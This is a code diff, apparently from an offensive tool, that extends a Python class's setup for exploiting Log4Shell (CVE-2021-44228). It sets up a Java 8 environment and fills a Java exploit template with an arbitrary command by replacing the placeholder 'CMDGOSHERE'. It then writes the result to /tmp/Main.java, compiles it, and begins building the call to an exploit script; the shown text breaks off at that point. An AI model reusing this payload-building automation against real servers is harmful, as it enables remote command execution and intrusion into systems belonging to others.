@@ -348,7 +348,16 @@ class Trainman:
         subprocess.Popen(
             jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
         )
-        env['PATH'] = env['PATH'] + f':/root/.jabba/jdk/adopt@1.8.0-292/bin'
+        env['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
+        env['PATH'] = env['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
+        with open('/L4sh/db/template.java', 'r') as template:
+            exploit_code = template.read().replace('CMDGOSHERE', exec_cmd)
+        with open('/tmp/Main.java', 'w') as temp_java:
+            temp_java.write(exploit_code)
+        build_exploit_cmd = ['javac', '/tmp/Main.java']
+        subprocess.Popen(
+            build_exploit_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
+        )
         exploit_cve_2021_44228_cmd = [
             'python3',
             'main.py',
